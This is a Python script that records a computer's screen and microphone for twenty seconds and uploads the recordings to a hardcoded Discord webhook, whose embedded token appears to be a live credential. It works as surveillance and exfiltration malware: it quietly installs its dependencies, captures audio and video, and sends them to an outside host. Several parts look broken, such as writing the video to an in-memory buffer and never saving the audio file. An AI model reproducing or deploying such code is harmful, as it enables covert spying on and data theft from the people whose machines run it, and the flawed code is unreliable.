import subprocess
import sys
import time
import io
import pyautogui
import cv2
import numpy as np
import requests
import pyaudio
from pydub import AudioSegment
from pydub.playback import play

def install_packages():
    """Install required packages."""
    requirements = [
        'pyautogui',
        'opencv-python',
        'numpy',
        'requests',
        'pyaudio',
        'pydub'
    ]
    for package in requirements:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

def upload_files_to_discord(video_file, audio_file):
    """Upload video and audio files to Discord via webhook."""
    webhook_url = 'https://discord.com/api/webhooks/1268235871740624977/T4pFfcwPV3L8dZVIQ4FqVzJOTClnyPtxkr20A8iYOz7GVzlkOsTKhwoSy63ij848tZOM'
    with open(video_file, 'rb') as video:
        video_files = {'file': ('recording.mp4', video, 'video/mp4')}
        video_response = requests.post(webhook_url, files=video_files)
    
    with open(audio_file, 'rb') as audio:
        audio_files = {'file': ('recording.mp3', audio, 'audio/mpeg')}
        audio_response = requests.post(webhook_url, files=audio_files)
    
    if video_response.status_code == 204:
        print("Video successfully uploaded to Discord.")
    else:
        print(f"Failed to upload video. Status code: {video_response.status_code}")
    
    if audio_response.status_code == 204:
        print("Audio successfully uploaded to Discord.")
    else:
        print(f"Failed to upload audio. Status code: {audio_response.status_code}")

def record_screen_and_audio(duration=20):
    """Record the screen and audio for a given duration in seconds."""
    # Screen recording setup
    screen_size = pyautogui.size()
    width, height = screen_size.width, screen_size.height
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    video_path = io.BytesIO()
    out = cv2.VideoWriter(video_path, fourcc, 20.0, (width, height))
    
    # Audio recording setup
    audio_path = io.BytesIO()
    audio_format = pyaudio.paInt16
    channels = 1
    rate = 44100
    chunk = 1024
    audio = pyaudio.PyAudio()
    stream = audio.open(format=audio_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
    audio_frames = []
    
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration:
            # Record video frame
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            
            # Record audio frame
            audio_data = stream.read(chunk)
            audio_frames.append(audio_data)
            
            time.sleep(0.05)
    
    except KeyboardInterrupt:
        print("Recording stopped.")
    
    # Release resources
    out.release()
    cv2.destroyAllWindows()
    stream.stop_stream()
    stream.close()
    audio.terminate()
    
    # Save audio file to BytesIO
    audio_data = b''.join(audio_frames)
    audio_segment = AudioSegment(
        data=audio_data,
        sample_width=audio_format / 8,
        frame_rate=rate,
        channels=channels
    )
    audio_segment.export(audio_path, format='mp3')
    
    # Save video file to BytesIO
    video_bytes = video_path.getvalue()
    video_path.seek(0)
    with open('recording.mp4', 'wb') as f:
        f.write(video_bytes)
    
    return 'recording.mp4', 'recording.mp3'

def main():
    try:
        import pyautogui
        import cv2
        import numpy as np
        import requests
        import pyaudio
        from pydub import AudioSegment
    except ImportError:
        print("Required packages are not installed. Installing...")
        install_packages()
        import pyautogui
        import cv2
        import numpy as np
        import requests
        import pyaudio
        from pydub import AudioSegment
    
    # Record screen and audio for 20 seconds
    video_file, audio_file = record_screen_and_audio(duration=20)
    
    # Upload the recorded video and audio to Discord
    upload_files_to_discord(video_file, audio_file)

if __name__ == "__main__":
    main()
